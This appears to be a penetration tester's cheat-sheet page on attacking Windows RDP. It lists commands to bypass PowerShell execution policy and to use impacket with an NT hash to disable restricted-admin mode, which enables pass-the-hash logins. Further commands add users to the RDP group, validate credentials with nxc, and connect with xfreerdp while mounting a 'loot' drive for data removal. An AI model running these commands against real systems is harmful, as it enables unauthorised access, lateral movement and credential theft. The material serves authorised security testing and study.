# RDP

## Overview

Interactive Windows access, auth validation, restricted-admin handling, and practical operator quality-of-life flags.

## Default Ports

- 3389/tcp default

## RDP Automation

- **PowerShell Script (example):**

```PowerShell
powershell -ep bypass
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
.\RDP-Automation.ps1 # Script content would involve enabling RDP, adding user, firewall rule
net user pwned
```

## impacket reg add example (Allow rdp connection without password)

```
impacket-reg <domain>/<username>@<ip> -hashes ':<nthath>' add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0'
```

## Windows Disable RDP restricted admin

https://www.rebeladmin.com/2016/02/restricted-admin-mode-for-remote-desktop-connections/
```
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force
```

## Add user to RDP Group

```
NET LOCALGROUP "Remote Desktop Users" <domain>\<username> /ADD
```

## Useful Additions

```bash
nxc rdp <target> -u <user> -p '<password>'
xfreerdp /v:<target> /u:<user> /p:'<password>' /cert-ignore /dynamic-resolution +clipboard /drive:loot,$(pwd)
```

## Common Attack Paths

- Credential reuse and local-admin validation.
- Restricted-admin or registry-state changes that alter pass-the-hash usability.
- Session access for manual privesc, GUI-only admin tools, browser-stored creds, or application consoles.

## See Also

- `04 Windows/Host Enumeration and Access.md`
- `04 Windows/Privilege Escalation.md`
